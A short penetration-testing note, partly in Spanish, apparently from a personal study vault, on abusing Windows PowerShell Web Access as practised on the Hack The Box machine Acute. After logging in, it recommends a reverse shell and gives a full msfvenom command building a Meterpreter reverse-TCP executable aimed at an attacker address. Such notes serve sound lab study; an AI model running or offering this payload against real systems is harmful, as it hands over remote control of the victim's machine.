
## DESCRIPTION

Windows PowerShell® Web Access, first introduced in Windows Server® 2012, acts as a Windows PowerShell gateway, providing a web-based Windows PowerShell console that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device.

#### Mas información
* https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)
* https://0xdf.gitlab.io/2022/07/16/htb-acute.html

## EXPLOITATION

1. Es necesario un login para el portal web:

![[Pasted image 20230214190927.png]]

2. Una vez que tenemos un login válido, entonces tenemos una powershell online que ejecuta comando en el sistema. El único problema es que suele ser un entorno limitado por lo que es recomendable establacer una reverse shell hacia nuestra máquina.

3. Podemos usar la reverse shell de Invoke-Powershell.ps1 [[POWERSHELL REVERSESHELL]] o bien generar una ".exe": 

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=4444 LHOST=10.10.14.6 -f exe -o rev.exe
```

4. Creamos un directorio web y la transferimos ala máquina [[TRANSFERRING FILES]] 

## MACHINES

* Hack The Box: Acute
